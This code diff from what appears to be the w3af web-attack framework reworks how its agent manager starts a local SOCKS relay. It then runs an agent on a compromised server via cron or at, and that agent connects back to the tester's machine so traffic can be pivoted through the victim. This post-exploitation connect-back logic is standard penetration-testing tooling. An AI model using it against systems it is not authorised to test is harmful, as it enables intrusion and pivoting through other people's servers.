@@ -91,15 +91,20 @@ class w3afAgentManager( w3afThread ):
                 # Start the w3afAgentServer
                 as = w3afAgentServer( socksPort=self._socksPort, listenPort=inboundPort )
                 as.start2()
+                # Wait for it to start.
+                time.sleep(0.5)
                 
-                # And now start the w3afAgentClient on the remote server using cron / at
-                self._delayedExecution( interpreter + ' ' + filename + ' ' + cf.cf.getData( 'localAddress' ) + ' ' + str( inboundPort ) )
-                
-                if as.isWorking():
-                    om.out.information('You may start using the w3afAgent that is listening on port '+ str(self._socksPort) +'. All connections made through this \
-SOCKS daemon will be relayed using the compromised server.')
+                if not as.isRunning():
+                    om.out.error( as.getError() )
                 else:
-                    om.out.error('Something went wrong, the w3afAgent client failed to connect back.')
+                    # And now start the w3afAgentClient on the remote server using cron / at
+                    self._delayedExecution( interpreter + ' ' + filename + ' ' + cf.cf.getData( 'localAddress' ) + ' ' + str( inboundPort ) )
+                
+                    if not as.isWorking():
+                        om.out.error('Something went wrong, the w3afAgent client failed to connect back.')
+                    else:
+                        om.out.information('You may start using the w3afAgent that is listening on port '+ str(self._socksPort) +'. All connections made through this SOCKS daemon will be relayed using the compromised server.')
+                        
     
     def _delayedExecution( self, command ):
         dexecf = delayedExecutionFactory( self._execMethod )
